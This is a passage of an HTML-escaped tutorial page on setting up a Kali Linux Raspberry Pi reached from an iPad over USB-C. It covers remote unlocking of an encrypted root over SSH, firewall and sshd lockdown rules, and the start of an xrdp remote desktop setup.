style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;case&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt; in&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;\tprereqs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\tprereqs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\texit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /scripts/functions&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;kill&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -TERM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; `&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /run/dnsmasq.pid&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; link&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; set&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dev&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; down&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; address&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; flush&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dev&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ip&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; route&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; flush&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dev&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/sbin/usb0down.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;umount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /sys/kernel/config&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Fix up permissions and finish setting things up:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make sure that new initramfs-tools scripts are executable.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/cryptroot-unlock-ssh.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/initramfs-tools/hooks/cryptroot-ssh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/initramfs-tools/hooks/ipad&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/initramfs-tools/scripts/init-top/ipad&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/share/initramfs-tools/scripts/local-bottom/ipad&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Regenerate initramfs.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkinitramfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /boot/initramfs.zst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /lib/modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Re4son-v8l+$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; sort&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tail&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Third moment of truth: Reboot your system. After a few moments you should be able to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; into it as root@10.55.0.1 (over USB C) and be prompted to unlock your root device. After you type in your decryption passphrase, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; should automatically close and your system should continue to boot. In a few more moments you should be able to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; back in as kali@10.55.0.1.&lt;/p&gt;\n&lt;p&gt;You can &lt;em&gt;also&lt;/em&gt; still unlock the system at the console, which is handy if you want to use the Pi as a stand-alone computer.&lt;/p&gt;\n&lt;p&gt;Note an annoying feature of this setup — you have to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; in as &lt;em&gt;root&lt;/em&gt; to do the initial unlock, but then will need to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; in a second time as &lt;em&gt;kali&lt;/em&gt; once the system is fully up. Partly, this is due to the fact that there’s not really a way to hand &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/SSH&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/SSH&quot;&gt;SSH&lt;/a&gt; off from the initram environment to the full system (this is why you have to log in once to unlock, and again to use the system once it’s fully up). Theoretically it should be possible to add a kali user to the initramfs, but doing so would require both the dropbear initramfs hooks to be modified (which, as previously mentioned, is fragile w.r.t. upgrades) and &lt;em&gt;a lot&lt;/em&gt; more magic in generally than seems advisable.&lt;/p&gt;\n&lt;h2 id=&quot;network-hardening&quot;&gt;Network hardening&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#network-hardening&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Now that we’ve got the Pi working with our iPad, we’re going to lock down networking a bit&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Limit SSH access to the kali user over usb0.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/ssh/sshd_config.d/lockdown.conf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;AllowUsers kali&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ListenAddress 10.55.0.1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;PermitRootLogin no&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; restart&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; sshd.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Basic firewall.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; install&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; gufw&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; start&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ufw.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ufw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; default&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; deny&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ufw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; allow&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; on&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 0.0.0.0/0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 68&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 0.0.0.0/0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 67&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; proto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; udp&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ufw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; allow&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; on&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; 10.55.0.0/29&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; to&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.55.0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; port&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 22&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; proto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ufw&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; enable&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;If you’re going to be using this device covertly, you almost certainly also want to run &lt;code&gt;sudo systemctl disable NetworkManager.service&lt;/code&gt; so that the Pi doesn’t attempt to immediately connect to whatever network you plug it into.&lt;/p&gt;\n&lt;h2 id=&quot;remote-desktop&quot;&gt;Remote desktop&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#remote-desktop&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Install xrdp.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; install&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; xrdp&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Turn off &quot;new&quot; cursors, as this causes problems with some&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# RDP clients. This isn&#039;t necessary if you&#039;re using Microsoft&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Remote Desktop, but is required to avoid the cursor being&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# surrounded by a weird box on Jump Desktop. The trade-off&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# here is that the &quot;new&quot; cursors look really nice, while the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# &quot;old&quot; cursors... Do not.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span 